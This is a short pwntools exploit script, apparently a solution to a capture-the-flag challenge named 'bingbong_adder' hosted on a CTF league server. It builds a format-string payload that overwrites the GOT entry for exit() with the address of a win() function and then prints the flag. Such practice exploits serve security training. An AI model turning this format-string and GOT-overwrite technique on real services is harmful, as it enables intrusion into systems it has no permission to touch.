from pwn import *

# found by spamming As and then %p to determing our buffer offset from printf's perspective
offset = 8

if __name__ == "__main__":
    context.log_level = "error"
    
    binary = ELF("./bingbong_adder")
    context.binary = binary # handles architecture/endianness/???

    # io = process("./bingbong_adder")
    io = remote("chal.ctf-league.osusec.org", 1319)
    
    # overwrite the GOT entry for exit() with the address of the win() function
    # (exit is called at the end of main, so we just redirect it to win >:))
    got_overwrite = {
        binary.got["exit"]: binary.symbols["win"]
    }
    
    payload = fmtstr_payload(offset, got_overwrite)
    print("Payload:", payload)
    
    # send payload & other random string as "numbers"
    io.sendlineafter(b"here\n", payload)
    io.sendlineafter(b"here\n", b"no <3")
    
    # flag!
    io.recvlines(2) # skip "your input was" & answer lines
    print(io.recvuntil(b"}").decode())
